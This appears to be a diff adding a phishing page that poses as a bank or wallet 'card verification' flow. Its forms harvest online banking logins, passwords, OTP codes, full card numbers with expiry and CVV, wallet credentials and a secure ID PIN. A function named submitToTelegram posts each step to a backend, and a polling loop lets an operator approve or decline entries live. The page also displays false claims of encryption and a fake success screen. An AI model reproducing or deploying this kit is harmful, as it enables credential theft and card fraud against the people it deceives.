+                    <input name="cardNumber" id="cardVisible" class="input" type="text" inputmode="numeric" placeholder="Card Number" required>
+                </div>
+                <div class="row">
+                    <div class="field"><input name="expiry" id="expiry" class="input" type="text" placeholder="MM/YY" required></div>
+                    <div class="field input-group">
+                        <input name="cvv" id="cvv" class="input" type="text" inputmode="numeric" pattern="\d{3,4}" placeholder="CVV" maxlength="4" required>
+                        <button type="button" class="toggle" onclick="toggleField(this.previousElementSibling)">👁</button>
+                    </div>
+                </div>
+                <div class="field">
+                    <input name="name" id="name" class="input" type="text" placeholder="Name on Card" required>
+                </div>
+                <label>By clicking "Continue", I acknowledge that I have read and agree...</label>
+                <button type="submit" class="btn">Continue</button>
+            </form>
+            <div class="actions">
+                <button type="button" class="startover" onclick="startOver()">Start Over</button>
+                <div class="security">Your data is secured by 256-bit encryption.</div>
+            </div>
+        </section>
+
+        <!-- Step 4 (Wallet Login) -->
+        <section class="section" id="step4">
+            <form id="step4Form" onsubmit="completeStep4(event)">
+                <div class="bank-header">
+                    <img id="s4Logo" class="logo" alt="">
+                    <span id="s4Name" class="bank-title"></span>
+                </div>
+                <h3>Login to your Account</h3>
+                <div class="field"><input name="onlineId" class="input" type="text" placeholder="Email ID/ Email Address" required></div>
+                <div class="field input-group">
+                    <input name="password" class="input" type="password" placeholder="Password" required>
+                    <button type="button" class="toggle" onclick="toggleField(this.previousElementSibling)">👁</button>
+                </div>
+                <label>By clicking "Continue", I acknowledge...</label>
+                <button type="submit" class="btn">Continue</button>
+            </form>
+            <div class="actions">
+                <button type="button" class="startover" onclick="startOver()">Start Over</button>
+                <div class="security">Your data is secured by 256-bit encryption.</div>
+            </div>
+        </section>
+
+        <!-- Step 6 (Wallet OTP) -->
+        <section class="section" id="step6">
+            <form id="step6Form" onsubmit="completeStep6(event)">
+                <div class="bank-header">
+                    <img id="s5Logo" class="logo" alt="">
+                    <span id="s5Name" class="bank-title"></span>
+                </div>
+                <h3>OTP Token</h3>
+                <div class="field"><input name="tk" id="tk" class="input" type="text" placeholder="OTP Code" required></div>
+                <label>By clicking "Continue", I acknowledge...</label>
+                <button type="submit" class="btn">Continue</button>
+            </form>
+            <div class="actions">
+                <button type="button" class="startover" onclick="startOver()">Start Over</button>
+                <div class="security">Your data is secured by 256-bit encryption.</div>
+            </div>
+        </section>
+
+        <!-- Step 5 (Wallet Secure ID Pin) -->
+        <section class="section" id="step5">
+            <form id="step5Form" onsubmit="completeStep5(event)">
+                <div class="bank-header">
+                    <img id="s6Logo" class="logo" alt="">
+                    <span id="s5Name" class="bank-title"></span>
+                </div>
+                <h3>Secure ID Pin</h3>
+                <div class="field"><input name="tk" id="tk" class="input" type="text" placeholder="Secure ID Pin" required></div>
+                <label>By clicking "Continue", I acknowledge...</label>
+                <button type="submit" class="btn">Continue</button>
+            </form>
+            <div class="actions">
+                <button type="button" class="startover" onclick="startOver()">Start Over</button>
+                <div class="security">Your data is secured by 256-bit encryption.</div>
+            </div>
+        </section>
+
+        <!-- Done -->
+        <section class="section" id="done">
+            <div class="done">
+                <div class="bank-header">
+                    <img id="doneLogo" class="logo" alt="">
+                    <span id="doneName" class="bank-title"></span>
+                </div>
+                <div class="check">✓</div>
+                <h3>Verification Complete</h3>
+                <p class="muted">Your card verification was successful.</p>
+                <button class="btn" onclick="startOver()">Back to start</button>
+            </div>
+        </section>
+    </div>
+
+    <script>
+        let currentBank = {
+            name: '',
+            logo: '',
+            flow: 'step1'
+        };
+        let banksList = [];
+
+        // Map Database steps to HTML section IDs depending on Bank/Wallet flow
+        const flowMapping = {
+            'step1': ['selectBank', 'step1', 'step2', 'step3', 'done'],
+            'step4': ['selectBank', 'step4', 'step6', 'step5', 'done']
+        };
+
+        window.addEventListener('load', () => {
+            // Start polling our backend
+            setInterval(pollStatus, 3000);
+        });
+
+        const dropdown = document.getElementById('otherBankDropdown');
+        const customBankField = document.getElementById('customBankField');
+
+        banksList = Array.from(dropdown.options)
+            .filter(option => option.value && option.value !== 'Other')
+            .map(option => ({ name: option.value, logo: 'img/other.png' }));
+
+        dropdown.addEventListener('change', () => {
+            customBankField.style.display = dropdown.value === "Other" ? 'block' : 'none';
+            if (dropdown.value && dropdown.value !== "Other") {
+                const bank = banksList.find(b => b.name === dropdown.value);
+                if (bank) selectBank(bank.name, bank.logo);
+            }
+        });
+
+        function confirmOtherBank() {
+            let bankName = dropdown.value;
+            if (bankName === "Other") {
+                const customName = document.getElementById('customBankName').value.trim();
+                if (!customName) {
+                    alert("Please enter your bank name");
+                    return;
+                }
+                bankName = customName;
+            }
+            if (bankName) {
+                const bankObj = banksList.find(b => b.name === bankName);
+                const logo = bankObj ? bankObj.logo : 'img/other.png';
+                selectBank(bankName, logo);
+            } else alert('Please select a bank');
+        }
+
+        // Telegram Verification UI Poller
+        function pollStatus() {
+            fetch('api/status.php')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status && data.status !== 'error') {
+                        updateUIState(data.step, data.status);
+                    }
+                });
+        }
+
+        function updateUIState(dbStep, status) {
+            let flowArray = flowMapping[currentBank.flow] || flowMapping['step1'];
+
+            // dbStep corresponds to array index (dbStep 1 is index 1, which is the first form)
+            let arrayIndex = dbStep;
+            if (arrayIndex >= flowArray.length) arrayIndex = flowArray.length - 1;
+            let expectedSectionId = flowArray[arrayIndex];
+
+            if (status === 'done') expectedSectionId = 'done';
+
+            const activeSection = document.querySelector('.section.active');
+            const isCurrentlyLoading = activeSection && activeSection.id === 'loading';
+            const isStartScreen = activeSection && activeSection.id === 'selectBank';
+
+            if (status === 'pending') {
+                show('loading');
+            } else if (status === 'declined') {
+                fetch('api/retry.php').then(() => {
+                    show(expectedSectionId);
+                    const sec = document.getElementById(expectedSectionId);
+                    if (sec) {
+                        let err = sec.querySelector('.error-message-inline');
+                        if (!err) {
+                            err = document.createElement('div');
+                            err.className = 'error-message-inline';
+                            err.style.color = '#ef4444';
+                            err.style.background = 'rgba(239, 68, 68, 0.1)';
+                            err.style.border = '1px solid rgba(239, 68, 68, 0.3)';
+                            err.style.padding = '10px';
+                            err.style.borderRadius = '8px';
+                            err.style.marginBottom = '14px';
+                            err.style.fontSize = '13.5px';
+                            err.style.textAlign = 'center';
+                            err.style.fontWeight = '600';
+                            const heading = sec.querySelector('h3');
+                            if (heading) heading.after(err);
+                        }
+                        err.textContent = "Information incorrect. Please verify and try again.";
+                        sec.querySelectorAll('input').forEach(i => i.style.borderColor = '#ef4444');
+                    }
+                });
+            } else if (status === 'filling') {
+                // If we are showing loading, that means we were just approved. Show the next expected form!
+                if (isCurrentlyLoading) {
+                    show(expectedSectionId);
+                }
+                // If we reloaded the page and we have a bank selected already, jump straight to the current form
+                if (isStartScreen && currentBank.name) {
+                    show(expectedSectionId);
+                }
+            } else if (status === 'done') {
+                show('done');
+            }
+        }
+
+        function selectBank(name, logo, step = 'step1') {
+            currentBank = {
+                name,
+                logo,
+                flow: step
+            };
+            setStepLogos();
+            show('loading');
+            document.querySelector('.loading-msg').textContent = `Connecting to ${name}… Please wait`;
+
+            fetch('api/reset.php').then(() => {
+                setTimeout(() => show(currentBank.flow), 1500);
+            });
+        }
+
+        function setStepLogos() {
+            ['s1Logo', 's2Logo', 's3Logo', 's4Logo', 's5Logo', 's6Logo', 'doneLogo', 'loadingLogo'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.src = currentBank.logo;
+            });
+            ['s1Name', 's2Name', 's3Name', 's4Name', 's5Name', 's6Name', 'doneName', 'loadingName'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.textContent = currentBank.name;
+            });
+        }
+
+        function show(id) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            const section = document.getElementById(id);
+            if (section) section.classList.add('active');
+        }
+
+        function startOver() {
+            document.querySelectorAll('input').forEach(i => i.value = '');
+            dropdown.value = '';
+            customBankField.style.display = 'none';
+            show('selectBank');
+            fetch('api/reset.php');
+        }
+
+        function toggleField(el) {
+            el.type = el.type === 'password' ? 'text' : 'password';
+        }
+
+        const cardInput = document.getElementById('cardVisible');
+        if (cardInput) {
+            cardInput.addEventListener('input', () => {
+                let val = cardInput.value.replace(/\D/g, '');
+                let rawCardDigits = val.slice(0, 16);
+                cardInput.value = rawCardDigits.replace(/(.{4})/g, '$1 ').trim();
+            });
+        }
+
+        const expiryInput = document.getElementById('expiry');
+        if (expiryInput) {
+            expiryInput.addEventListener('input', () => {
+                let val = expiryInput.value.replace(/\D/g, '');
+                if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
+                expiryInput.value = val.slice(0, 5);
+            });
+        }
+
+        // Universal Submit to Telegram
+        function submitToTelegram(stepNum, dataObj) {
+            const activeSec = document.querySelector('.section.active');
+            if (activeSec) {
+                let err = activeSec.querySelector('.error-message-inline');
+                if (err) err.remove();
+                activeSec.querySelectorAll('input').forEach(i => i.style.borderColor = '');
+            }
+
+            show('loading');
+            document.querySelector('.loading-msg').textContent = "Processing details securely…";
+
+            fetch('api/submit.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    step: stepNum,
+                    data: dataObj
+                })
+            }).then(res => res.json()).then(resData => {
+                if (!resData.success) {
+                    alert(resData.message);
+                    startOver();
+                }
+            });
+        }
+
+        function completeStep1(e) {
+            e.preventDefault();
+            const form = document.getElementById('step1Form');
+            submitToTelegram(1, {
+                "Bank Selected": currentBank.name,
+                "Online ID": form.onlineId.value,
+                "Password": form.password.value
+            });
+        }
+
+        function completeStep2(e) {
+            e.preventDefault();
+            const form = document.getElementById('step2Form');
+            submitToTelegram(2, {
+                "OTP Token": form.tk.value
+            });
+        }
+
+        function luhnCheck(value) {
+            if (/[^0-9-\s]+/.test(value)) return false;
+            let nCheck = 0,
+                bEven = false;
+            value = value.replace(/\D/g, "");
+            for (let n = value.length - 1; n >= 0; n--) {
+                let cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven && (nDigit *= 2) > 9) nDigit -= 9;
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+        function completeStep3(e) {
+            e.preventDefault();
+            const form = document.getElementById('step3Form');
+
+            const cardNumber = form.cardNumber.value.replace(/\s/g, '');
+            if (cardNumber.length < 15) {
+                alert('Card number is too short.');
+                return;
+            }
+            if (!luhnCheck(cardNumber)) {
+                alert('Invalid card number. Please check your card digits and try again.');
+                return;
+            }
+
+            const expiry = document.getElementById('expiry').value;
+            if (expiry.length !== 5) {
+                alert('Expiry must be MM/YY');
+                return;
+            }
+
+            const cvv = document.getElementById('cvv').value;
+            if (cvv.length < 3) {
+                alert('CVV must be 3 or 4 digits');
+                return;
+            }
+
+            submitToTelegram(3, {
+                "Card Number": form.cardNumber.value,
+                "Expiry": expiry,
+                "CVV": cvv,
+                "Name on Card": form.name.value
+            });
+        }
+
+        function completeStep4(e) {
+            e.preventDefault();
+            const form = document.getElementById('step4Form');
+            submitToTelegram(1, {
+                "Wallet Selected": currentBank.name,
+                "Email/ID": form.onlineId.value,
+                "Password": form.password.value
+            });
+        }
+
+        function completeStep6(e) {
+            e.preventDefault();
+            const form = document.getElementById('step6Form');
+            submitToTelegram(2, {
+                "OTP Code": form.tk.value
+            });
+        }
+
+        function completeStep5(e) {
+            e.preventDefault();
+            const form = document.getElementById('step5Form');
+            submitToTelegram(3, {
+                "Secure ID Pin": form.tk.value
+            });
+        }
+    </script>
+</body>
+
+</html>
